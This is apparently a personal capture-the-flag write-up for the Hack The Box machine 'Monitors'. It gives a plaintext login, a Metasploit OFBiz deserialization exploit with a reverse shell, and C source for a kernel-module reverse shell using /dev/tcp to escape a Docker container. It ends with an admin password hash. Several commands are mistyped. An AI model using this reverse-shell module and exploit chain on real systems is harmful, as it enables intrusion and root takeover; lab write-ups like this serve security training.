# Monitors
IP: 10.10.10.238


https://0xdedinfosec.github.io/posts/htb-monitors/

username/pass
marcus 
VerticalEdge2020


## root 

First we start as always with sudo -l, but no luck this time. 
Next is lets see if any service is running on the machine. 

````bash
netsatat -antp
````

It allows me to all network connection and the process behind them. I see there a service running on port 8443 which is commonly used for webservice.
It look like curl is not installed on the machine. Mening we have to get the access to it from our hosts machine. 
Let create a bidirectional ssh tunnel 
from the hostmachine
````bash
ssh -l <localport>:localhost:<forenport> hostname
ssh -l 8443:127.0.0.1:8443 marcus@monitor.htb
````

Go to https://127.0.0.1:8443 and you will be presented with a apache tomcat server version 9.0.31

https://www.rapid7.com/db/modules/exploit/linux/http/apache_ofbiz_deserialization/ 

````bash 
msfconsole -q 
use exploit/linux/http/apache\_ofbiz\_deserialization
set payload linux/x64/shell/reverse_tcp 
set rhosts 127.0.0.1
set lhost 10.10.14.200
set lport 8001
set forceexploit true
run
```` 

and we got acess, but inside a docker container... 
privileged container check 
````bash
ip link add dummy0 type dummy
````
And it a fail meaning we do not have a priv container.

Let's check the `ip` of `docker0` interface inside marcus `ssh` shell.

````bash
ip a
````


rev-shell.c
````bash
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");
char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/172.17.0.1/9874 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}
module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
````




makefile
````bash
obj-m +=rev-shell.o
all:
        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
````

On the marcus shell start a listner 

````bash
nc -lvnp 9874
````

inside the docker container
transfer the two file 
````bash
make clean
make all 
insmod rev-shell-ko
````

and we got root.

admin hash : 
vSJnzptH$pCoAuyngEc2pUm3Hos6qTNzopXdvnXACaAZEDAQU4VoBc19qxa9eASxv/EKnkTEOWWGyuPobtS/QA2kAFkrWP0